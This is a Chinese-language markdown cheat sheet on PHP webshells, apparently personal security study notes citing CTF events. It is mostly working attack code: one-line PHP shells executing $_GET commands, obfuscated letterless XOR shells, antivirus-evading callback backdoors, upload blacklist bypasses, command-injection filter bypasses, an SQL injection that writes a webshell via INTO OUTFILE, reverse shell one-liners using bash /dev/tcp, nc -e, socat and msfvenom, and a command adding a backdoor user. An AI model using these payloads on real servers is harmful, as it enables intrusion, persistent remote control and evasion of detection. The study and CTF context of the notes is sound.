# Webshell
一種以網頁形式存在的命令執行環境，也稱作**網頁後門**。  
黑客可以通過瀏覽自己放的後門，得到一個shell以操控伺服器。  
1. 大馬  
程式較龐大，調用system func()，通常會以加密隱藏代碼。   
2. 小馬  
程式小巧   
3. 一句話木馬  
一段小代碼，可做插入，變化多樣。  
*  [How works](#how-works)  
*  [Command injection](#command-injection)  
*  [Webshell cheatsheet](#webshell-cheatsheet)  
*  [Bypass blacklist extension](#bypass-blacklist-extension)  
*  [SQL inj to webshell](#sql-inj-to-webshell)  
*  [Don't delete my webshell](#dont-delete-my-webshell)  
*  [Reverse shell](#reverse-shell)  
*  [Privilege escalation](#privilege-escalation)  
*  [Reference](#reference)

# How works
我們可以通過網站自帶的文件上傳功能將webshell送上去，而文件裡的代碼由server解析進一步執行!  
1. 尋找上傳點   
* echo 一個shell到文件中執行  
* 下載 shell  
2. 繞過上傳限制 進行上傳  
* 直接上傳  
* 繞過  

# Command injection
```php
// match one character
cat fla?
cat ./???sword

// match multiple character
cat f*

// 繞過空白字元限制 
cat${IFS}flag
cat$IFSflag
IFS=,;`cat<<<cat,flag`    // 將,指定為分割符，將 cat,flag 作為輸入提供給 cat
cat< flag          // 使cmd從file讀入
```
   
# Webshell cheatsheet
```php
// 回顯
<?php system('ls'); ?>
<?php system(ls); ?>
<?php system($_GET['cmd']); ?>
<?php system($_GET[1]); ?>

<?php passthru('ls'); ?>


// 不回顯
<?php shell_exec('echo 1>1'); ?>        // 1=echo 1>1
<?php shell_exec('>1');    ?>        // 1=>1

<?php shell_exec('wget -O 1.php url');   ?> // download shell
<?php shell_exec('curl -o 1.php url');  ?>  // 預設下載index.html

<?=`$_GET[1]`;          ?>         // <?= is used to shorten the <?php echo `blah`;
// ``就像exec不會直接顯示結果，需要echo
echo `$_GET[1]`;&1=ls

echo "{${phpinfo()}}";
echo "{${system("ls")}}";
die("...");


// 文件包含漏洞
include$_GET[1];             // 中間空格可以省略
include /var/lib/php/sessions/sess_xxxxx  // session內容可控的情況

// 思路：寫入base64編碼過的shell檔，再進行解碼  <環境www>
$_GET[1](file,chracter,8);&1=file_put_contents .....
include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=file


// PHP代碼執行
<?php eval('echo `ls`;');    ?>   // eval裡的PHP代碼必須加;
<?php assert('phpinfo();');   ?> // assert裡的PHP代碼可以不加;

<?php preg_replace("/\[(.*)]/e",'\\1',$_GET['str']);  ?> // ？str=[phpinfo()]
// 必須有匹配才會執行
// PHP 5.5起，會產生 E_DEPRECATED 錯誤
// PHP 7.0.0後，必須使用 preg_replace_callback() 代替


// 思路：延伸數組＋回調函數 php 5.4以後的特性
// 回調後門 多可以避免木馬查殺  
// 參考下方reference
?1[]=blah&1[]=system();&2=assert     
param=usort(...$_GET);
```
長度限制思路：  
* 用檔名拼湊成命令,再一次ls進一個shell script [detail](https://shinmao.github.io/2018/02/20/A-tiny-shell/)

[system v.s. exec v.s. shell_exec](https://blog.longwin.com.tw/2013/06/php-system-exec-shell_exec-diff-2013/)  
**exec()和shell_exec()我們都會搭個echo**  
[這是一篇很屌的php lib exp分析](https://stackoverflow.com/questions/3115559/exploitable-php-functions)  

```php
// 最簡單的是用.串接字元
$😭 = $😙. $😀. $🤗. $🤗. $🤩. $😆. $🙂. $🤔;

// XOR
$😊 = "||||%-" ^ "/%/(``"; 
$😊 ("`|" ^ ",/");
```
在VXCTF2018中，使用了這個無字母，無數字，無底線的shell，內容為`<?=SYSTEM(LS);`。  
```php
<?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);
```  
在`Meepwn Quals 2018`中，使用了這個無文字shell，如果礙於底線，也可以換成表情符號...
[VXCTF2018](https://github.com/shinmao/CTF-writeups/tree/master/vxcon2018)

# Bypass blacklist extension
文件解析漏洞  
除了`.php`，通過conf模塊的regular expression：  
* `.php3`  
* `.php4`  
* `.php5`  
* `.php7`  
* `.pht`  
* `.phtml`  
以上副檔名也都會被解析成`.php`  
* `.php.xxx`  
在古老的版本中也存在**多後綴名**的繞過方式  
原理：apache2特性由右至左解析，遇到不認識的無法解析就像左跳！  
* `.php/.` 
值得注意的是 這招無法覆蓋舊檔  
原理：php源碼中可以看到用遞歸的方式將檔名結尾的`/.`都去掉！  
[源碼審計](https://github.com/shinmao/Web-Security-Learning/blob/master/Webshell/apache2_php5.conf)  
* `move_uploaded_file()`  
配合lstat()在這個函式中的使用，可以突破`/.`沒辦法覆蓋舊檔的限制。  
[參考自家筆記](https://shinmao.github.io/web/2018/04/13/The-Magic-from-0CTF-ezDoor/)

# SQL inj to webshell
MYSQL:  
```
select into outfile(dumpfile)  // mysql write to document
```  
E.G.  
```  
union select 1,2,"<? system($_GET['fuck']) ?>" into outfile "://path"
```

# Dont delete my webshell
筆記一些好用的木馬免殺  
```php
<?php
$e = $_REQUEST['e'];
register_shutdown_function($e, $_REQUEST['pass']);
// 結束時callback
// ?e=assert&pass=phpinfo();

<?php
$e = $_REQUEST['e'];
declare(ticks=1);
register_tick_function ($e, $_REQUEST['pass']);
?>
```  
關於免殺的部分，還可以參考lemon師傅的[Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)  

# Reverse shell
目標為內網主機，外網無法發起連接。反彈shell就是webshell發起一個shell到外網，就可獲得目標的shell控制環境。  
1. bash一句話  
```php
bash -i >& /dev/tcp/target_ip/8080 0>&1
```  
`>&`表示聯合符號前面的內容與後面結合，重定向給後者。`0>&1`表示將`std_input`與`std_output`結合，然後重定向給`std_output`。  
2. netcat一句話  
```php
// 外網主機
nc -lvvp 8080   // 監聽8080port
nc target_ip 8080 -t -e /bin/bash
```
建立連結後執行`/bin/bash`  
3. socat  
```php
socat tcp-listen:8080 -
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:target_ip:8080
```  
4. python, php, java, perl  
http://www.03sec.com/3140.shtml  
5. msfvenom獲取payload  
```php
msfvenom -l payloads cmd/unix/reverse
// 會羅列出所有反彈腳本
msfvenom -p cmd/unix/xxxx lhost=target_ip lport=target_port R
```  
  
若反彈shell交互性非常差  
1. 添加使用者  
```php
useradd new;echo 'new:password'|chpasswd
useradd new;echo -e 'xxxxxxx' |passwd test
```  
2. python獲取標準shell  
```php
python -c "import pty;pty.spawn('/bin/bash')"
```  

reference from [安全客](https://www.anquanke.com/post/id/87017)  

# Privilege escalation  
提權手勢  
1. [利用crontab提權](https://www.anquanke.com/post/id/148564#h2-2)  
2. [通过可写文件获取Root权限的多种方式](http://www.freebuf.com/articles/system/175086.html)  
   改寫可寫文件的內容，可以通過SUID執行文件讓自己提升成root，或是利用`sudo -l`...

### Reference  
* [千变万化的WebShell-Seebug](https://paper.seebug.org/36/)
* [七字短shell](http://wonderkun.cc/index.html/?p=524%EF%BC%88%E9%80%9A%E8%BF%87)  
* [PHP MANUAL Assert](http://php.net/manual/en/function.assert.php)  
* [PHP MANUAL Usort](http://php.net/manual/en/function.usort.php)  
* [PHP MANUAL 延長數組](http://php.net/manual/zh/migration56.new-features.php)
* [P師傅木馬免殺](https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html)  
* [stackoverflow Exploitable PHP functions](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
* [Ali0thNotes PHP代码审计归纳](https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md)
